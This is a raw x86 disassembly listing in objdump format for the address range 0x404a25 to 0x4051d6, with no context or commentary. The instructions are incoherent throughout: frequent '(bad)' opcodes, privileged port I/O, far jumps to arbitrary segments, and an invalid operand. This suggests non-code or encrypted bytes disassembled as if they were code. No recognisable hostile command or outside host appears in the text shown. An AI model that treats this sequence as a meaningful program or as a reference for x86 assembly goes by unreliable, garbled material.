  404a25:	je     0x404a71
  404a27:	in     eax,dx
  404a28:	dec    edi
  404a29:	fsubr  st(3),st
  404a2b:	dec    edi
  404a2c:	inc    edx
  404a2d:	sub    eax,edx
  404a2f:	int3   
  404a30:	cmp    bh,BYTE PTR [ecx+ebp*4]
  404a33:	jg     0x4049ee
  404a35:	test   DWORD PTR [eax+eiz*2+0x356a810d],ebp
  404a3c:	sub    al,0xe
  404a3e:	int3   
  404a3f:	aaa    
  404a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a41:	std    
  404a42:	xchg   esi,eax
  404a43:	pop    edi
  404a44:	push   edi
  404a45:	cmp    ah,BYTE PTR [ebp+0x2c38f80b]
  404a4b:	dec    ecx
  404a4c:	(bad)  
  404a4d:	add    edi,DWORD PTR ds:0xf67910f1
  404a53:	dec    esp
  404a54:	pushf  
  404a55:	dec    ebx
  404a56:	je     0x404a76
  404a58:	pop    ss
  404a59:	xor    al,0xce
  404a5b:	ja     0x404a40
  404a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5e:	jnp    0x404a7a
  404a60:	push   ebx
  404a61:	push   esi
  404a62:	sbb    DWORD PTR [eax+0x42],0xffffff97
  404a66:	xor    eax,0xc46fff24
  404a6b:	sub    ch,BYTE PTR [ebx]
  404a6d:	in     al,0x67
  404a6f:	(bad)  
  404a70:	fidiv  WORD PTR [edi+ebp*2-0x29fc6d6a]
  404a77:	adc    DWORD PTR [ecx-0x5a],ecx
  404a7a:	inc    esi
  404a7b:	repnz test eax,0x200d732d
  404a81:	jo     0x404a60
  404a83:	adc    ecx,DWORD PTR [ebx+ecx*8-0xd]
  404a87:	les    eax,FWORD PTR [edi+ecx*1]
  404a8a:	adc    al,0x98
  404a8c:	es loop 0x404a8d
  404a8f:	or     DWORD PTR [edx-0x42],esp
  404a92:	and    edi,DWORD PTR [ebp-0x1afcce48]
  404a98:	aas    
  404a99:	xchg   ebx,eax
  404a9a:	jnp    0x404a44
  404a9c:	cs xchg edx,eax
  404a9e:	push   eax
  404a9f:	mov    al,cl
  404aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aa2:	repz or eax,0xe0cf3eaf
  404aa8:	sbb    edi,DWORD PTR cs:[ebx+ebp*2+0x78]
  404aad:	into   
  404aae:	push   DWORD PTR [edi+0x749740cc]
  404ab4:	dec    eax
  404ab5:	and    esi,DWORD PTR [ecx+0x3e]
  404ab8:	sub    bl,ch
  404aba:	sti    
  404abb:	leave  
  404abc:	cmp    ecx,DWORD PTR [esi+0xb]
  404abf:	sbb    eax,edi
  404ac1:	push   cs
  404ac2:	pop    ss
  404ac3:	fadd   QWORD PTR [edx+0x3c]
  404ac6:	ror    BYTE PTR [ecx],0x77
  404ac9:	mov    edx,0x293153d8
  404ace:	addr16 dec ebp
  404ad0:	fwait
  404ad1:	lods   al,BYTE PTR ds:[esi]
  404ad2:	mov    edx,0xc1fbb93d
  404ad7:	and    eax,DWORD PTR [eax+0x55]
  404ada:	push   ecx
  404adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404adc:	xor    BYTE PTR [ebp-0x69],bh
  404adf:	push   cs
  404ae0:	dec    ecx
  404ae1:	lahf   
  404ae2:	adc    eax,edi
  404ae4:	rol    DWORD PTR [ebx-0x54cb0d25],1
  404aea:	mov    cl,0x53
  404aec:	shr    BYTE PTR [ebx+0x78],1
  404aef:	mov    dh,0x2e
  404af1:	stc    
  404af2:	arpl   WORD PTR [esi-0x23b1443f],cx
  404af8:	push   edx
  404af9:	and    eax,0x3b0f8ee9
  404afe:	xchg   ecx,eax
  404aff:	inc    esp
  404b00:	out    0x73,al
  404b02:	add    DWORD PTR [edi-0x10],ebp
  404b05:	call   0x8752:0x5cffbc99
  404b0c:	aaa    
  404b0d:	cmp    al,0xe8
  404b0f:	adc    bl,bl
  404b11:	sti    
  404b12:	xor    eax,0x352cdc68
  404b17:	sub    eax,0x5b8618c5
  404b1c:	adc    bl,BYTE PTR [esi+0x5d]
  404b1f:	stc    
  404b20:	fld    QWORD PTR [edx-0x4649e77a]
  404b26:	xlat   BYTE PTR ds:[ebx]
  404b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b28:	call   0xeac3:0x385eaa75
  404b2f:	stos   DWORD PTR es:[edi],eax
  404b30:	lds    edi,FWORD PTR [ebx-0x43]
  404b33:	inc    esp
  404b34:	push   ebx
  404b35:	ror    BYTE PTR ss:[eax],cl
  404b38:	mov    BYTE PTR [ecx],ah
  404b3a:	aam    0x1b
  404b3c:	and    al,dl
  404b3e:	and    eax,0xedba97d5
  404b43:	xchg   BYTE PTR ds:0xabff364a,cl
  404b49:	sub    al,BYTE PTR [edi+0x22]
  404b4c:	mov    bh,0x9c
  404b4e:	adc    DWORD PTR [edi-0x3e],0x57
  404b52:	fmul   QWORD PTR [eax]
  404b54:	jg     0x404b36
  404b56:	test   eax,0xca9b7d77
  404b5b:	iret   
  404b5c:	pop    ecx
  404b5d:	lds    esp,FWORD PTR ds:[eax+eax*4-0x702b81e1]
  404b65:	rol    DWORD PTR [edx+0x62],1
  404b68:	mov    es,ebx
  404b6a:	cmp    edx,0x7230c5bc
  404b70:	lods   eax,DWORD PTR ds:[esi]
  404b71:	push   ebp
  404b72:	dec    edi
  404b73:	add    ebx,DWORD PTR [edi+esi*8]
  404b76:	in     al,0x69
  404b78:	pop    ss
  404b79:	das    
  404b7a:	xor    BYTE PTR [edx+edi*4+0x4d7794c],0xbf
  404b82:	or     ah,BYTE PTR [edi+0x5]
  404b85:	or     cl,0xb7
  404b88:	fisttp WORD PTR [ecx-0x54]
  404b8b:	fbld   TBYTE PTR [esi]
  404b8d:	nop
  404b8e:	aam    0x6a
  404b90:	xchg   ebp,eax
  404b91:	mov    cl,0x11
  404b93:	je     0x404b4b
  404b95:	orps   xmm6,XMMWORD PTR [ecx+0x13]
  404b99:	int    0xc
  404b9b:	pop    ecx
  404b9c:	or     eax,DWORD PTR [eax]
  404b9e:	mov    edx,0x1fe66aa3
  404ba3:	adc    BYTE PTR [ebx-0x64],al
  404ba6:	add    eax,ebx
  404ba8:	inc    eax
  404ba9:	adc    al,0xa8
  404bab:	test   BYTE PTR [esi+0x7266ac7e],al
  404bb1:	jg     0x404bb3
  404bb3:	clc    
  404bb4:	retf   0xd22d
  404bb7:	aaa    
  404bb8:	mov    eax,es:0xdb419d5
  404bbe:	sub    al,0xaa
  404bc0:	jns    0x404bee
  404bc2:	inc    ebx
  404bc3:	lds    ebp,FWORD PTR [edi+0x46647624]
  404bc9:	fdivrp st(3),st
  404bcb:	pop    esp
  404bcc:	daa    
  404bcd:	mov    WORD PTR [ebx-0x2f],ss
  404bd0:	rcl    bh,0xb7
  404bd3:	push   es
  404bd4:	adc    eax,0x81e75601
  404bd9:	jns    0x404c01
  404bdb:	rcr    dh,1
  404bdd:	loope  0x404c3d
  404bdf:	leave  
  404be0:	iret   
  404be1:	inc    edx
  404be2:	bound  ebp,QWORD PTR [edx-0x74f64475]
  404be8:	ins    BYTE PTR es:[edi],dx
  404be9:	call   0xea3e46b6
  404bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bef:	ror    DWORD PTR [edx+0x2cec3738],0x1
  404bf6:	inc    esp
  404bf7:	dec    eax
  404bf8:	sub    dh,BYTE PTR [ecx]
  404bfa:	and    BYTE PTR [ebx-0x26],ch
  404bfd:	lods   eax,DWORD PTR ds:[esi]
  404bfe:	fild   DWORD PTR [edi-0xf]
  404c01:	sbb    eax,0xc1058b67
  404c06:	out    dx,al
  404c07:	shl    DWORD PTR [edi*4-0x5d05b646],1
  404c0e:	fbstp  TBYTE PTR [eax]
  404c10:	mov    bl,dl
  404c12:	nop
  404c13:	xlat   BYTE PTR ds:[ebx]
  404c14:	ror    BYTE PTR cs:[edx],0x84
  404c18:	add    bl,bh
  404c1a:	add    esp,DWORD PTR [ebx+0x2b362bb3]
  404c20:	cs inc ecx
  404c22:	aaa    
  404c23:	inc    eax
  404c24:	in     eax,dx
  404c25:	mov    eax,ds:0xe88f832a
  404c2a:	or     eax,0xfa8845e1
  404c2f:	jecxz  0x404bea
  404c31:	int    0x40
  404c33:	mov    ecx,0xb9f25932
  404c38:	out    0x21,al
  404c3a:	loope  0x404c44
  404c3c:	xchg   DWORD PTR [ebp-0x59f581f2],esi
  404c42:	sbb    al,0xec
  404c44:	stos   DWORD PTR es:[edi],eax
  404c45:	mov    cl,0x90
  404c47:	pop    esp
  404c48:	mov    eax,ds:0xc9881424
  404c4d:	mov    ebp,0xe0671186
  404c52:	add    eax,0x1492e082
  404c57:	adc    dh,dh
  404c59:	outs   dx,BYTE PTR ds:[esi]
  404c5a:	inc    ecx
  404c5b:	pop    esp
  404c5c:	out    0xf2,al
  404c5e:	ins    DWORD PTR es:[edi],dx
  404c5f:	pop    ss
  404c60:	cwde   
  404c61:	cli    
  404c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c63:	pop    es
  404c64:	sbb    cl,ah
  404c66:	xchg   esi,eax
  404c67:	xchg   DWORD PTR [edi],ebp
  404c69:	mov    dh,0x8c
  404c6b:	mov    ecx,0x6b854949
  404c70:	daa    
  404c71:	jbe    0x404cdc
  404c73:	(bad)  
  404c74:	(bad)  
  404c75:	jmp    0xbb78:0xcece7c8
  404c7c:	cmp    eax,0x79cedfc5
  404c81:	call   0x5e299ae0
  404c86:	xchg   ecx,eax
  404c87:	sti    
  404c88:	mov    edx,DWORD PTR [ebx-0x2470df9d]
  404c8e:	sahf   
  404c8f:	into   
  404c90:	mov    eax,0x1ee2d9c8
  404c95:	jno    0x404c7c
  404c97:	pusha  
  404c98:	dec    eax
  404c99:	dec    eax
  404c9a:	jmp    0xb822e7db
  404c9f:	mov    WORD PTR [eax],es
  404ca1:	jmp    0x404cef
  404ca3:	rcr    BYTE PTR [ecx-0x72],0xe6
  404ca7:	pop    ebx
  404ca8:	(bad)  
  404ca9:	pop    edi
  404caa:	mov    cl,0x4c
  404cac:	mov    esp,0xe91fd91d
  404cb1:	scas   al,BYTE PTR es:[edi]
  404cb2:	ror    BYTE PTR [edi+0x64],cl
  404cb5:	retf   
  404cb6:	xor    edx,ebx
  404cb8:	pop    ss
  404cb9:	ret    
  404cba:	sbb    eax,0x966ac15f
  404cbf:	push   ds
  404cc0:	dec    ebp
  404cc1:	add    DWORD PTR [edx-0x7a2f6bff],0xfcd11416
  404ccb:	out    dx,eax
  404ccc:	jecxz  0x404cce
  404cce:	jne    0x404cb1
  404cd0:	push   ebx
  404cd1:	fisubr WORD PTR [edx+0x79]
  404cd4:	mov    BYTE PTR [eax+0xb2fee53],ch
  404cda:	pop    es
  404cdb:	xor    ecx,DWORD PTR [ecx*2+0x10393c30]
  404ce2:	(bad)  [ecx-0x30553b5c]
  404ce8:	icebp  
  404ce9:	adc    cl,ah
  404ceb:	add    al,0xcf
  404ced:	pop    ss
  404cee:	fcmovu st,st(7)
  404cf0:	push   ecx
  404cf1:	jge    0x404cb3
  404cf3:	add    DWORD PTR [eax-0x1fe26e0a],edi
  404cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cfa:	adc    DWORD PTR [ebx+0x46],0x67aa69ac
  404d01:	jbe    0x404ced
  404d03:	mov    al,0xc7
  404d05:	jmp    0x5ce8:0x3c61fc9e
  404d0c:	dec    esi
  404d0d:	test   eax,0xdf63d6d1
  404d12:	xchg   esp,eax
  404d13:	cdq    
  404d14:	lds    edi,FWORD PTR [eax]
  404d16:	inc    ecx
  404d17:	enter  0x2405,0x5c
  404d1b:	retf   0x800e
  404d1e:	into   
  404d1f:	leave  
  404d20:	mov    al,ds:0xe3f66042
  404d25:	adc    bl,al
  404d27:	xor    ecx,DWORD PTR [edi-0x62]
  404d2a:	mov    bh,0x83
  404d2c:	xchg   ebp,eax
  404d2d:	jmp    0xfb1a:0xb69bf154
  404d34:	fndisi(8087 only) 
  404d36:	mov    ah,0x6e
  404d38:	xchg   ecx,eax
  404d39:	mov    ds:0xf1cc74eb,al
  404d3e:	xchg   ebp,eax
  404d3f:	shl    DWORD PTR [edx-0x39],1
  404d42:	outs   dx,DWORD PTR ds:[esi]
  404d43:	mov    eax,DWORD PTR [ecx-0x1c]
  404d46:	push   edi
  404d47:	fdivr  DWORD PTR [esi+0x19219023]
  404d4d:	push   ebp
  404d4e:	ror    ah,0xe7
  404d51:	into   
  404d52:	push   edi
  404d53:	test   DWORD PTR [ebp+0x47],0x8ccd1446
  404d5a:	inc    ebp
  404d5b:	sbb    eax,0x6528e18a
  404d60:	sar    DWORD PTR [esi-0x2d],0x17
  404d64:	loopne 0x404d41
  404d66:	es inc ebx
  404d68:	loop   0x404cf6
  404d6a:	and    BYTE PTR [ebp+0x5038be19],dh
  404d70:	loopne 0x404d21
  404d72:	push   es
  404d73:	jge    0x404d29
  404d75:	arpl   bp,cx
  404d77:	mov    ecx,0x8d6813d6
  404d7c:	cmp    DWORD PTR [edi+0x560c2f08],eax
  404d82:	cmc    
  404d83:	lods   al,BYTE PTR ds:[esi]
  404d84:	push   edx
  404d85:	push   es
  404d86:	mov    dh,0xb4
  404d88:	and    dh,BYTE PTR [ebx]
  404d8a:	or     ebx,eax
  404d8c:	add    eax,0x49987d08
  404d91:	stos   DWORD PTR es:[edi],eax
  404d92:	mov    DWORD PTR [ecx],esi
  404d94:	xor    al,0xf6
  404d96:	jmp    0x8271a222
  404d9b:	popf   
  404d9c:	lods   al,BYTE PTR ds:[esi]
  404d9d:	add    BYTE PTR [ecx],ah
  404d9f:	loope  0x404ddf
  404da1:	cld    
  404da2:	sbb    ecx,esp
  404da4:	sahf   
  404da5:	cmp    al,0x59
  404da7:	mov    ds:0xfe21ec79,al
  404dac:	mov    bl,0xe6
  404dae:	and    dl,bl
  404db0:	neg    DWORD PTR ds:[esi+0x7a452111]
  404db7:	add    DWORD PTR [edi+edi*4],0x6
  404dbb:	xor    eax,0x8d8dfb52
  404dc0:	mov    ds:0x9286596c,eax
  404dc5:	xor    DWORD PTR [edx+0xe190ade],eax
  404dcb:	dec    esi
  404dcc:	push   esi
  404dcd:	ss xchg ebp,eax
  404dcf:	stos   BYTE PTR es:[edi],al
  404dd0:	enter  0x994f,0x21
  404dd4:	retf   
  404dd5:	loop   0x404e3d
  404dd7:	sub    eax,DWORD PTR [esi]
  404dd9:	sti    
  404dda:	sbb    ecx,DWORD PTR [ebx+0x4e]
  404ddd:	push   es
  404dde:	sbb    eax,0x678265ec
  404de3:	lock test al,0x5
  404de6:	mov    bl,0x12
  404de8:	in     eax,0x97
  404dea:	add    DWORD PTR [ecx-0x78],ecx
  404ded:	xchg   edi,eax
  404dee:	je     0x404e11
  404df0:	ins    DWORD PTR es:[edi],dx
  404df1:	mov    ds:0xabdebe87,eax
  404df6:	xor    dh,BYTE PTR [edi-0x2a]
  404df9:	(bad)  
  404dfa:	cli    
  404dfb:	dec    eax
  404dfc:	call   0xc603a701
  404e01:	mov    eax,0x1e5c8511
  404e06:	fwait
  404e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e08:	mov    esi,DWORD PTR [ecx-0x52869127]
  404e0e:	fcom   DWORD PTR [ecx]
  404e10:	sar    DWORD PTR [edx-0x4d],0xfb
  404e14:	lahf   
  404e15:	sets   BYTE PTR [edi+0x653eb549]
  404e1c:	xchg   ebx,eax
  404e1d:	add    al,0x43
  404e1f:	push   ebp
  404e20:	lock jp 0x404e96
  404e23:	les    edi,FWORD PTR [eax+0x30ef41cb]
  404e29:	sub    edi,DWORD PTR [esi+0x7883fb4a]
  404e2f:	gs js  0x404db8
  404e32:	mov    ecx,0xd44d37c7
  404e37:	clc    
  404e38:	jbe    0x404e67
  404e3a:	sbb    eax,0x31d2537e
  404e3f:	sbb    BYTE PTR [edi],bl
  404e41:	cld    
  404e42:	mov    dh,0xdc
  404e44:	xchg   esi,eax
  404e45:	sbb    ebx,edi
  404e47:	fwait
  404e48:	lds    ebx,FWORD PTR [ecx]
  404e4a:	jecxz  0x404e21
  404e4c:	pop    esi
  404e4d:	adc    eax,DWORD PTR [ecx+0x4]
  404e50:	xchg   ebx,eax
  404e51:	pop    es
  404e52:	cmp    ch,BYTE PTR [ecx+0x364d45f2]
  404e58:	push   ecx
  404e59:	shl    BYTE PTR [ebp-0x7da18192],0x2
  404e60:	fwait
  404e61:	cmc    
  404e62:	repz jae 0x404df9
  404e65:	gs ja  0x404e3b
  404e68:	xlat   BYTE PTR ds:[ebx]
  404e69:	sub    DWORD PTR [edx],edx
  404e6b:	aas    
  404e6c:	inc    ecx
  404e6d:	arpl   WORD PTR [esi+0x58],di
  404e70:	push   cs
  404e71:	shl    DWORD PTR [esi+0x6d016ba6],cl
  404e77:	shl    BYTE PTR ds:0xaf39e1d6,1
  404e7d:	fldenv [esi+0x49]
  404e80:	pop    esp
  404e81:	(bad)  
  404e82:	push   edx
  404e83:	mov    al,ds:0x11e36868
  404e88:	stos   BYTE PTR es:[edi],al
  404e89:	or     ah,ch
  404e8b:	ja     0x404e79
  404e8d:	aas    
  404e8e:	mov    ah,0xeb
  404e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e91:	xchg   DWORD PTR [edi],esp
  404e93:	mov    ch,0x33
  404e95:	outs   dx,BYTE PTR ds:[esi]
  404e96:	add    eax,0xb2dcae5a
  404e9b:	pusha  
  404e9c:	mov    al,0xff
  404e9e:	mov    bh,0x64
  404ea0:	jmp    0xebb4:0x60f14462
  404ea7:	xchg   ebp,eax
  404ea8:	dec    eax
  404ea9:	out    dx,al
  404eaa:	retf   0x3c5f
  404ead:	push   es
  404eae:	pop    ecx
  404eaf:	dec    edx
  404eb0:	dec    ebx
  404eb1:	xchg   DWORD PTR [eax+0x2c],edx
  404eb4:	imul   esp,DWORD PTR [ebp-0x5],0xffffffd6
  404eb8:	test   DWORD PTR [ecx+0x6],edx
  404ebb:	lea    ecx,[ebp+0xc]
  404ebe:	mov    bl,0x85
  404ec0:	dec    ecx
  404ec1:	jmp    0x404e8e
  404ec3:	hlt    
  404ec4:	repnz xlat BYTE PTR ds:[ebx]
  404ec6:	sub    eax,0x5c11417f
  404ecb:	add    edx,DWORD PTR ds:0xfca1e24d
  404ed1:	inc    edi
  404ed2:	jmp    0x404e8a
  404ed4:	popf   
  404ed5:	retf   0x582e
  404ed8:	mov    al,0x6d
  404eda:	test   DWORD PTR [edx+0x692625cb],esp
  404ee0:	dec    eax
  404ee1:	out    0x19,al
  404ee3:	inc    edi
  404ee4:	cmp    bh,0x79
  404ee7:	repz cmp BYTE PTR [ebp+0x20f74422],ah
  404eee:	(bad)  
  404ef0:	fcom   QWORD PTR ss:[ecx-0x197b0e5c]
  404ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef8:	scas   eax,DWORD PTR es:[edi]
  404ef9:	dec    eax
  404efa:	sub    DWORD PTR [esi-0x6bca315c],0x1049e5c3
  404f04:	aas    
  404f05:	mov    ds:0x22043b71,eax
  404f0a:	push   edi
  404f0b:	pushf  
  404f0c:	js     0x404f0c
  404f0e:	ins    DWORD PTR es:[edi],dx
  404f0f:	jl     0x404ecd
  404f11:	sub    al,0x7b
  404f13:	or     DWORD PTR [edx+0x4976fcdd],esp
  404f19:	mov    DWORD PTR [eax+0x12],0x8dad42ba
  404f20:	ret    0xb7c5
  404f23:	mov    edi,0xa2ab4d0e
  404f28:	pop    edi
  404f29:	xchg   ecx,eax
  404f2a:	mov    al,ds:0xdc0cb42e
  404f2f:	mov    WORD PTR [esi],fs
  404f31:	push   eax
  404f32:	inc    ecx
  404f33:	inc    DWORD PTR [edi-0x35]
  404f36:	call   0xff9e:0xec317950
  404f3d:	jo     0x404efe
  404f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f40:	ret    
  404f41:	hlt    
  404f42:	out    dx,al
  404f43:	lods   eax,DWORD PTR ds:[esi]
  404f44:	sub    al,0x95
  404f46:	fwait
  404f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f48:	lock dec ebx
  404f4a:	adc    al,0x19
  404f4c:	jnp    0x404f35
  404f4e:	out    dx,eax
  404f4f:	in     al,0x11
  404f51:	xchg   esp,eax
  404f52:	and    eax,0x5a03c770
  404f57:	xchg   esp,eax
  404f58:	sub    al,0xc8
  404f5a:	jge    0x404f2c
  404f5c:	imul   ebx,DWORD PTR [eax],0xea670f59
  404f62:	mov    eax,eax
  404f64:	push   edi
  404f65:	(bad)  
  404f66:	test   DWORD PTR [ecx],edx
  404f68:	fild   DWORD PTR [ebx+0x40]
  404f6b:	mov    edx,0x7fbedbe7
  404f70:	scas   eax,DWORD PTR es:[edi]
  404f71:	inc    ebx
  404f72:	je     0x404fed
  404f74:	jl     0x404f4b
  404f76:	and    al,0x13
  404f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f79:	or     ebx,edx
  404f7b:	dec    ebp
  404f7c:	shrd   DWORD PTR [esi],edi,cl
  404f7f:	aas    
  404f80:	int3   
  404f81:	mov    ?,WORD PTR [edi]
  404f83:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404f85:	cdq    
  404f86:	mov    eax,0x7b394290
  404f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f8c:	cmp    edi,edi
  404f8e:	push   ss
  404f8f:	popa   
  404f90:	sbb    esp,DWORD PTR [edx]
  404f92:	dec    esi
  404f93:	xchg   ebx,eax
  404f94:	adc    ecx,DWORD PTR [eax+0x0]
  404f97:	xchg   ecx,eax
  404f98:	imul   esp,edx,0x5ce47f5b
  404f9e:	mov    edi,0x21d4666b
  404fa3:	mov    eax,DWORD PTR [edi-0x54bcd9a3]
  404fa9:	ss clc 
  404fab:	std    
  404fac:	jns    0x405007
  404fae:	nop
  404faf:	pop    esi
  404fb0:	jns    0x404f58
  404fb2:	push   0x7c
  404fb4:	add    DWORD PTR [ecx-0x2348035a],esp
  404fba:	jbe    0x405008
  404fbc:	mov    esp,ebx
  404fbe:	jae    0x404f90
  404fc0:	(bad)  
  404fc1:	xchg   ecx,eax
  404fc2:	jae    0x404fa3
  404fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc5:	mul    BYTE PTR [edi+0x25efcdc8]
  404fcb:	mov    ebx,0xf4947ad5
  404fd0:	adc    ah,BYTE PTR [ebp-0x1754e72b]
  404fd6:	mov    ds:0xb83394ef,al
  404fdb:	inc    esi
  404fdc:	in     al,dx
  404fdd:	cmp    al,0xad
  404fdf:	add    bh,BYTE PTR [edi-0x2307c356]
  404fe5:	shl    DWORD PTR [edx-0x683a6ba],1
  404feb:	or     ch,ch
  404fed:	pop    ebp
  404fee:	cld    
  404fef:	rcr    BYTE PTR [esi-0x152bcf5b],0x16
  404ff6:	outs   dx,DWORD PTR ds:[esi]
  404ff7:	push   ds
  404ff8:	sub    ebx,DWORD PTR [ebx+0x6365de1a]
  404ffe:	mov    bh,0xd4
  405000:	adc    eax,DWORD PTR [ebp+0x1ec2716a]
  405006:	ins    DWORD PTR es:[edi],dx
  405007:	mov    al,ds:0x34888dd0
  40500d:	xchg   esi,eax
  40500e:	lods   al,BYTE PTR ds:[esi]
  40500f:	mov    ds:0x2ecd2fde,al
  405014:	sub    dh,BYTE PTR [edi-0xd]
  405017:	lds    edx,FWORD PTR [ebx+edi*1+0x9]
  40501b:	idiv   BYTE PTR [ecx-0x33815fcb]
  405021:	push   esi
  405022:	add    ecx,DWORD PTR [ebx]
  405024:	cmp    edx,DWORD PTR [ebx+0x6e]
  405027:	loop   0x405066
  405029:	imul   esi,DWORD PTR [ebx-0x29f30089],0xffffffd7
  405030:	push   edi
  405031:	fbstp  TBYTE PTR [ebx]
  405033:	push   ebp
  405034:	xlat   BYTE PTR ds:[ebx]
  405035:	add    edi,esi
  405037:	pop    esi
  405038:	jle    0x405043
  40503a:	imul   ecx,DWORD PTR [ecx-0x64],0x75855cbe
  405041:	sbb    WORD PTR [edx+0x79],ax
  405045:	push   eax
  405046:	mov    edx,DWORD PTR [ebp-0x1]
  405049:	mov    cl,0x7f
  40504b:	int3   
  40504c:	dec    edx
  40504d:	jmp    0x405083
  40504f:	jge    0x404fe3
  405051:	mov    eax,0xeafdcad5
  405056:	push   edx
  405057:	(bad)
  40505b:	fwait
  40505c:	adc    al,0x2c
  40505e:	and    bl,BYTE PTR [edx+0x55]
  405061:	mov    WORD PTR [esi-0x84257c1],es
  405067:	push   cs
  405068:	push   ss
  405069:	sub    al,0xca
  40506b:	jnp    0x405088
  40506d:	je     0x405020
  40506f:	dec    edi
  405070:	aam    0xbd
  405072:	xor    dh,BYTE PTR [esi-0xf6ca153]
  405078:	mov    esi,0xedc10efb
  40507d:	pop    ecx
  40507e:	mov    dl,0xf5
  405080:	fbstp  TBYTE PTR [ecx+0xc]
  405083:	mov    ah,0x67
  405085:	ss out 0xd,al
  405088:	pusha  
  405089:	es clc 
  40508b:	scas   al,BYTE PTR es:[edi]
  40508c:	xor    eax,0xd30b843
  405091:	loopne 0x40501d
  405093:	outs   dx,BYTE PTR ds:[esi]
  405094:	cdq    
  405095:	cmp    BYTE PTR [ecx-0x39],0x66
  405099:	and    dl,BYTE PTR [esi]
  40509b:	jmp    0x4050ae
  40509d:	ds xor eax,0x36ff1d1b
  4050a3:	xor    al,0x2b
  4050a5:	pusha  
  4050a6:	sub    DWORD PTR [esi-0x3a7c0b2c],esp
  4050ac:	sub    DWORD PTR [esi-0x2d],ebp
  4050af:	push   ss
  4050b0:	faddp  st(0),st
  4050b2:	inc    edi
  4050b3:	stos   DWORD PTR es:[edi],eax
  4050b4:	iret   
  4050b5:	adc    eax,0x6e867bfe
  4050ba:	and    al,0x22
  4050bc:	jg     0x40508b
  4050be:	dec    esi
  4050bf:	and    BYTE PTR [ebx-0x77],dh
  4050c2:	mov    bh,0xa5
  4050c4:	add    al,0xbf
  4050c6:	js     0x405112
  4050c8:	mov    edi,DWORD PTR [esi]
  4050ca:	in     al,0xa7
  4050cc:	outs   dx,BYTE PTR ds:[esi]
  4050cd:	sbb    ah,dl
  4050cf:	sub    dh,bh
  4050d1:	push   ebx
  4050d2:	dec    BYTE PTR [esi+0x73]
  4050d5:	or     ebp,ebx
  4050d7:	xor    eax,0xe5582d56
  4050dc:	leave  
  4050dd:	jnp    0x4050e8
  4050df:	or     eax,0x53c76475
  4050e4:	ss push 0xffffff88
  4050e7:	(bad)
  4050ea:	push   ds
  4050eb:	mov    ecx,0x762fb2f2
  4050f0:	call   0xa96d:0x261f2ac8
  4050f7:	adc    BYTE PTR [eax],bh
  4050f9:	adc    DWORD PTR cs:[ecx+0x54],ebx
  4050fd:	dec    edx
  4050fe:	sbb    ebx,DWORD PTR [edx-0x2140291d]
  405104:	das    
  405105:	lds    ebp,FWORD PTR [edx]
  405107:	pushf  
  405108:	out    dx,eax
  405109:	leave  
  40510a:	pushf  
  40510b:	out    0xac,al
  40510d:	retf   0xc47
  405110:	(bad)  
  405111:	and    al,bh
  405113:	mov    eax,gs
  405115:	retf   0x59b0
  405118:	mov    esp,0xebf07d7d
  40511d:	adc    al,0xe0
  40511f:	cld    
  405120:	push   cs
  405121:	push   ebx
  405122:	int    0x9b
  405124:	sar    esi,0x97
  405127:	loope  0x405181
  405129:	lahf   
  40512a:	or     eax,0x3699e18a
  40512f:	leave  
  405130:	fistp  QWORD PTR [edi]
  405132:	pop    esi
  405133:	inc    ecx
  405134:	jmp    0x9d8c4e41
  405139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40513a:	sbb    bl,dh
  40513c:	mov    bl,0xad
  40513e:	jl     0x405183
  405140:	add    DWORD PTR [edi+0x2f],0x7f
  405144:	dec    esp
  405145:	jo     0x405192
  405147:	inc    ebp
  405148:	mov    ah,0x1d
  40514a:	jmp    0xc1a:0x41d1230f
  405151:	fiadd  DWORD PTR [ecx+ebp*1]
  405154:	mov    dh,0xa8
  405156:	pop    es
  405157:	mov    al,BYTE PTR [esi]
  405159:	sub    bl,bl
  40515b:	jo     0x4051c5
  40515d:	xor    BYTE PTR [ecx-0x329b0ca5],bl
  405163:	retf   0x4f77
  405166:	xchg   edi,eax
  405167:	dec    edi
  405168:	sbb    eax,0xa21f3c2
  40516d:	(bad)  
  40516e:	push   0xffffff80
  405170:	push   esi
  405171:	retf   
  405172:	dec    edx
  405173:	loopne 0x405176
  405175:	and    eax,0x4555e1a4
  40517a:	add    eax,0x55cb0673
  40517f:	jmp    0x16ac:0x7cdb4041
  405186:	mov    dh,0x28
  405188:	outs   dx,DWORD PTR ds:[esi]
  405189:	sub    dh,cl
  40518b:	pop    ds
  40518c:	repz dec ecx
  40518e:	and    ebx,DWORD PTR [ecx+0x5afd8c51]
  405194:	gs hlt 
  405196:	imul   ebx,DWORD PTR [ecx+0x75],0x3c2947d7
  40519d:	and    BYTE PTR [edi],ah
  40519f:	sbb    eax,0x3b0ba1ee
  4051a4:	pop    ds
  4051a5:	or     BYTE PTR [ebx-0x38],al
  4051a8:	cmp    al,0x25
  4051aa:	mov    esp,0x24165197
  4051af:	add    BYTE PTR [eax+0x61],ah
  4051b2:	gs js  0x4051a1
  4051b5:	jns    0x4051eb
  4051b7:	jle    0x405166
  4051b9:	fadd   QWORD PTR [edx+0x79989d3b]
  4051bf:	cmp    DWORD PTR [ecx+0x77286129],edx
  4051c5:	icebp  
  4051c6:	int3   
  4051c7:	and    bl,BYTE PTR [esp+eax*1-0x3c695a2a]
  4051ce:	rcr    al,cl
  4051d0:	push   es
  4051d1:	jecxz  0x405219
  4051d3:	push   esp
  4051d4:	cld    
  4051d5:	int3   
  4051d6:	(bad)  
